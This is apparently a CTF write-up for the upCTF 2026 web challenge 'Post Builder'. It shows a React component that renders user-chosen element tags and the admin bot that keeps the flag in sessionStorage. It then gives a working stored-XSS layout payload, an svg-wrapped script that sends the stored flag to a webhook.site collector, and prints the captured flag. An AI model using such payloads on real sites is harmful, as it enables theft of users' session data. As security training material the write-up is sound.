---
layout: post
title:  "Post Builder"
date:   2026-03-09 17:43:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /upCTF-2026-Post-Builder/
---

**Title**: Post Builder

**Category**: web

**Author**: 0xacb

**Description**: A modern web application for creating and sharing posts with custom layouts.

I get the challenge files:
```shell
unzip post-builder.zip  
Archive:  post-builder.zip  
   creating: app/  
   creating: app/frontend/  
  inflating: app/frontend/package.json  
   creating: app/frontend/public/  
  inflating: app/frontend/public/index.html  
   creating: app/frontend/src/  
  inflating: app/frontend/src/index.css  
  inflating: app/frontend/src/App.js  
   creating: app/frontend/src/pages/  
  inflating: app/frontend/src/pages/ViewPost.js  
  inflating: app/frontend/src/pages/Login.js  
  inflating: app/frontend/src/pages/Register.js  
  inflating: app/frontend/src/pages/Home.js  
  inflating: app/frontend/src/pages/CreatePost.js  
  inflating: app/frontend/src/index.js  
  inflating: app/frontend/src/App.css  
   creating: app/frontend/src/components/  
  inflating: app/frontend/src/components/Navbar.js  
  inflating: app/frontend/src/components/Element.js  
  inflating: app/frontend/src/components/LayoutRenderer.js  
   creating: app/backend/  
  inflating: app/backend/models.py  
  inflating: app/backend/requirements.txt  
  inflating: app/backend/app.py  
   creating: bot/  
  inflating: bot/bot.js  
  inflating: bot/package.json  
  inflating: bot/Dockerfile  
  inflating: Dockerfile  
  inflating: entrypoint.sh  
  inflating: .env.example  
  inflating: nginx.conf  
  inflating: supervisord.conf
```

In `Element.js` `React.createElement(wrapper, null, ...children)` takes unsanitized input:
```js
import React from 'react';

function Element({ config }) {
  if (!config || typeof config !== 'object') {
    return null;
  }

  const { wrapper = 'div', children = [] } = config;

  const renderChildren = (childrenArray) => {
    if (!Array.isArray(childrenArray)) {
      return null;
    }

    return childrenArray.map((child, index) => {
      if (typeof child === 'string') {
        return child;
      } else if (typeof child === 'object') {
        return <Element key={index} config={child} />;
      }
      return null;
    });
  };

  return React.createElement(
    wrapper,
    null,
    ...renderChildren(children)
  );
}

export default Element;
```

`bot.js` stores the `FLAG` environment variable in `sessionStorage` as `adminFlag`:
```js
const express = require('express');
const puppeteer = require('puppeteer-core');

const app = express();
app.use(express.json());

const FLAG = process.env.FLAG || 'FLAG{test_flag}';
const WEB_URL = process.env.WEB_URL || 'http://127.0.0.1:5001';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const rateLimitStore = new Map();
const RATE_LIMIT = 3;
const RATE_WINDOW = 60000; // 60 seconds in ms

function checkRateLimit(ip) {
    const now = Date.now();
    const windowStart = now - RATE_WINDOW;
    
    let timestamps = rateLimitStore.get(ip) || [];
    timestamps = timestamps.filter(t => t > windowStart);
    
    if (timestamps.length >= RATE_LIMIT) {
        return false;
    }
    
    timestamps.push(now);
    rateLimitStore.set(ip, timestamps);
    return true;
}

async function visitUrl(urlToVisit) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            executablePath: '/usr/bin/chromium', // Uses the apt-get installed Chromium
	    pipe: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox', // Crucial for running as root
                '--disable-dev-shm-usage',
                '--disable-gpu',
		'--single-process'
            ]
        });
        
        const page = await browser.newPage();
        
        // Go to login page
        await page.goto(`${WEB_URL}/login`, { waitUntil: 'networkidle2' });
        
        // Execute login script and inject variables safely
        await page.evaluate(async (password, flag, targetUrl, webUrl) => {
            const loginData = { username: 'admin', password: password };
            await fetch('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(loginData),
                credentials: 'include'
            });
            sessionStorage.setItem('adminFlag', flag);
            window.location.href = targetUrl.replace(webUrl, '');
        }, ADMIN_PASSWORD, FLAG, urlToVisit, WEB_URL);

        // Wait for 6 seconds to let any XSS payloads trigger
        await new Promise(r => setTimeout(r, 6000));

    } catch (error) {
        console.error(`Error visiting URL: ${error.message}`);
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}

app.post('/visit', (req, res) => {
    const clientIp = req.ip;
    if (!checkRateLimit(clientIp)) {
        return res.status(429).json({ error: 'Rate limit exceeded. Please try again later.' });
    }

    const { url } = req.body;
    if (!url) {
        return res.status(400).json({ error: 'Missing url parameter' });
    }

    if (!url.startsWith(WEB_URL)) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    // Fire and forget (don't await) so the API responds immediately
    visitUrl(url);

    return res.status(200).json({ message: 'Bot will visit your URL shortly' });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok' });
});

app.listen(8000, '0.0.0.0', () => {
    console.log('Puppeteer Bot listening on port 8000');
});
```

I create an account and login to the site at `http://46.225.117.62:30010/login`. Then I create a new post on `http://46.225.117.62:30010/create` containing this layout json:
```json
[
  {
    "wrapper": "svg",
    "children": [
      {
        "wrapper": "script",
        "children": [
          "new Image().src='https://webhook.site/<id>/?x='+sessionStorage.getItem('adminFlag')"
        ]
      }
    ]
  }
]
```
Once the post is created I view the post and click on `Report to Admin`. 

`bot.js` will then: 
1. Log in as admin 
2. Store the flag: `sessionStorage.setItem('adminFlag', flag)` 
3. Navigate to the attackers post URL
4. The SVG script fires and `new Image().src` sends the flag to the webhook

Back on `webhook.site` I get the flag: `https://webhook.site/<id>/?x=upCTF{r34ct_js_1s_still_j4v4scr1pt-QeqHLBz157388667}`

`upCTF{r34ct_js_1s_still_j4v4scr1pt-QeqHLBz157388667}`